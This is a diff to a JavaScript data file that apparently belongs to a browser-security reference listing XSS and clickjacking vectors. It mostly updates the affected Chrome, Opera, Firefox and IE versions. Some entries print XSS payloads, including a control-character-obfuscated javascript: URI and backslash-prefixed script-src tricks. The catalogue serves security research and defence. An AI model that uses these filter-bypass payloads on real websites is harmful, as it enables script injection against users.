@@ -3453,8 +3451,8 @@ var items =
         'browsers'   : {
             'internet explorer': ['6.0', '7.0', '8.0'],
             'firefox': ['3.x', '4.0'],
-            'opera'  : ['9.x', '10.x', 'mobile'],
-            'chrome' : ['4.0', '5.0', '6.0'],
+            'opera'  : ['9.x', '10.x', '11.0', 'mobile'],
+            'chrome' : ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
             'safari' : ['3.0', '4.0', '5.0'],
         },
         'tags'       : ['trick', 'css', 'obfuscation', 'internet explorer', 'firefox', 'opera', 'chrome', 'safari', 'comment'],
@@ -3487,10 +3485,10 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'internet explorer': ['6.0', '7.0', '8.0'],
+            'internet explorer': ['6.0', '7.0', '8.0', '9.0'],
             'firefox': ['2.x', '3.x', '4.0'],
-            'opera'  : ['9.x', '10.x', 'mobile'],
-            'chrome' : ['5.0', '6.0'],
+            'opera'  : ['9.x', '10.x', '11.0', 'mobile'],
+            'chrome' : ['5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
             'safari' : ['4.0', '5.0'],
         },
         'tags'       : ['xss', 'internet explorer', 'firefox','opera', 'chrome', 'safari', 'separator'],
@@ -3508,7 +3506,7 @@ var items =
         },
         'data'       : '<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:%js_alert%>XXX</a>',
         'description': {
-	    'en' : 'This example shows that Google Chrome and Safari ignore the following characters in the URI (excluding 9,10,13) : 1-8,11,12. Also Safari ignores in the URI unencoded null character.',
+	    'en' : 'This example shows that Google Chrome and Safari ignore the following characters in the URI (excluding 9,10,13) : 1-8,11,12. Also Safari ignores in the URI unencoded null character. The problem has been fixed in recent Chrome versions.',
             'ja' : '',
             'ru' : 'Пример как бы намекает, что Google Chrome и Safari помимо символов с десятичным кодом 9,10,13, игнорируемых в URI всеми браузерами, также игнорирует символы 1-8,11,12. Кроме того, Safari игнорирует в URI незакодированный нулевой символ.',
             'cs' : 'Tento příklad ukazuje že Google Chrome a Safari ignorují následující znaky v URI (mimo 9,10,13) : 1-8,11,12. Safari ignoruje v URI nekódovaný nulový znak.',
@@ -3523,7 +3521,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'chrome' : ['5.0', '6.0'],
+            'chrome' : ['5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
             'safari' : ['4.0', '5.0'],
         },
         'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'chrome', 'safari'],
@@ -3556,7 +3554,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'internet explorer' : ['6.0', '7.0', '8.0'],
+            'internet explorer' : ['6.0', '7.0', '8.0', '9.0'],
         },
         'tags'       : ['xss', 'javascript', 'internet explorer', 'parser', 'backtick', 'plaintext'],
         'reporter'   : '.mario, hasegawayosuke'
@@ -3589,7 +3587,7 @@ var items =
         },                        
         'browsers'   : {
             'firefox' : ['4.0'],
-            'chrome' : ['6.0', '7.0', '8.0'],
+            'chrome' : ['6.0', '7.0', '8.0', '9.0', '10.0'],
 			'safari' : ['5.0']
         },
         'tags'       : ['xss', 'javascript', 'spoofing', 'history', 'phishing'],
@@ -3622,7 +3620,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'opera' : ['10.x', 'mobile']
+            'opera' : ['10.x', '11.0', 'mobile']
         },
         'tags'       : ['xss', 'javascript', 'svg', 'tinysvg', 'listener', 'xml', 'events'],
         'reporter'   : '.mario'
@@ -3654,7 +3652,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'opera' : ['10.x', 'mobile']
+            'opera' : ['10.x', '11.0', 'mobile']
         },
         'tags'       : ['xss', 'javascript', 'svg', 'svgz', 'gzip', 'xml', 'compression'],
         'reporter'   : '.mario'
@@ -3780,7 +3778,7 @@ var items =
             'cs' : 'SVG podporuje několik nových CSS vlastností (clip-path, fill, filter, marker, marker-end, marker-mid, marker-start, mask, stroke), které mohou odkazovat na externí SVG zdroje. Tyto vlastnosti mohou vystupovat také jako samostetné atributy. V rámci externího SVG mohou obsahovat informace oživující stávající SVG dokument. Příklad ukazuje animační odkazy, ale může zahrnovat i animace a jiné prvky. Upozorňujeme, že Opera neukazuje změnu adresy odkazu, pokud nad ním nestojí kurzor.',
             'de' : ''
         },
-        'urls'    : [''],
+        'urls'    : [],
         'howtofix'   : {
             'en' : '',
             'ja' : '',
@@ -3860,7 +3858,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'chrome' : ['5.0', '6.0', '7.0', '8.0', '9.0'],
+            'chrome' : ['5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
             'safari' : ['4.0', '5.0']
         },
         'tags'       : ['xss', 'css', 'google chrome', 'safari', 'trick', 'notation'],
@@ -3926,7 +3924,7 @@ var items =
         },                        
         'browsers'   : {
             'firefox' : ['2.x', '3.x', '4.0'],
-            'opera'   : ['9.x','10.x', 'mobile']
+            'opera'   : ['9.x','10.x', '11.0', 'mobile']
         },
         'tags'       : ['xss', 'css', 'firefox', 'opera', 'trick', 'selector', 'attribute'],
         'reporter'   : 'LeverOne'
@@ -3958,7 +3956,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'chrome' : ['5.0', '6.0', '7.0', '8.0', '9.0'],
+            'chrome' : ['5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
             'safari' : ['4.0', '5.0']
         },
         'tags'       : ['xss', 'css', 'google chrome', 'safari', 'trick', 'notation'],
@@ -4071,7 +4069,7 @@ var items =
             'cs' : '',
             'de' : ''
         },
-        'data'       : '<div draggable="true" ondragstart="event.dataTransfer.setData(\'text/plain\',\'malicious code\');">\n\t<h1>Drop me</h1>\n</div>\n\n<iframe src="http://www.example.org/dropHere.html">\n</iframe>',        
+        'data'       : '<div draggable="true" ondragstart="event.dataTransfer.setData(\'text/plain\',\'malicious code\');">\n\t<h1>Drop me</h1>\n</div>\n\n<iframe src="http://www.example.org/dropHere.html"></iframe>',        
         'description': {
             'en' : 'The method "setData" allows, with the event handler "ondragstart" and the attribute "draggable" with the value "true", to drag the text "malicious code" and not "Drop me" into the IFRAME. This IFRAME can consist of a web page with an input field to drop in data.',
             'ja' : '',
@@ -4156,7 +4154,6 @@ var items =
         },                        
         'browsers'   : {
             'internet explorer': ['5.0', '6.0', '7.0', '8.0'],
-            'opera': ['8.x', '9.x', '10.x', '11.x'], 
             'firefox' : ['2.x', '3.x', '4.0'], 
             'chrome': ['6.0', '7.0', '8.0', '9.0', '10.0'],
             'safari': ['5.0']
@@ -4191,7 +4188,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'firefox' : ['3.x']
+            'firefox' : ['3.x', '4.0']
         },
         'tags'       : ['clickjacking', 'firefox', 'svg', 'masking'],
         'reporter'   : 'mniemietz'
@@ -4223,7 +4220,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'chrome' : ['8.x']
+            'chrome' : ['8.0']
         },
         'tags'       : ['clickjacking', 'chrome', 'iframe', 'sandbox'],
         'reporter'   : 'kkotowicz'
@@ -4256,9 +4253,9 @@ var items =
         },                        
         'browsers'   : {
 		    'internet explorer': ['8.0'],
-            'opera': ['10.x', '11.x'], 
-            'firefox' : ['2.x', '3.x'], 
-            'chrome': ['8.x', '9.x', '10.x'],
+            'opera': ['10.x', '11.0'], 
+            'firefox' : ['2.x', '3.x', '4.0'], 
+            'chrome': ['8.0', '9.0', '10.0'],
             'safari': ['5.0']
         },
         'tags'       : ['clickjacking', 'classjacking', 'jQuery', 'class'],
@@ -4274,7 +4271,7 @@ var items =
             'cs'    : '',
             'de'    : ''
         },
-        'data'      : '<script src=\"/\\example.com\\foo.js\"><\/script> \/\/ Safari 5.0, Chrome 9\n<script src=\"\\\\example.com\\foo.js\"><\/script> \/\/ Safari 5.0',
+        'data'      : '<script src=\"/\\example.com\\foo.js\"><\/script> \/\/ Safari 5.0, Chrome 9, 10\n<script src=\"\\\\example.com\\foo.js\"><\/script> \/\/ Safari 5.0',
         'description' : {
             'en'    : 'Safari treats backslashes the same way as slash inside URL attributes. Chrome treats prefix "/\\" of URL the same way as "\/\/".',
             'ja'    : 'Safari\u306fURL\u5c5e\u6027\u5024\u5185\u306e\u30d0\u30c3\u30af\u30b9\u30e9\u30c3\u30b7\u30e5\u0028\u5186\u8a18\u53f7\u0029\u3092\u30b9\u30e9\u30c3\u30b7\u30e5\u3068\u540c\u69d8\u306b\u6271\u3044\u307e\u3059\u3002Chrome\u306fURL\u5148\u982d\u306e\u0022\u002f\u005c\u0022\u3092\u0022\u002f\u002f\u0022\u3068\u540c\u69d8\u306b\u6271\u3044\u307e\u3059\u3002',
@@ -4291,7 +4288,7 @@ var items =
             'de'    : ''
         },
         'browsers'  : {
-            'chrome': [ '9.x' ],
+            'chrome': [ '9.0', '10.0' ],
             'safari': [ '5.0' ]
         },
         'tags'      : [ 'html', 'dom' ],
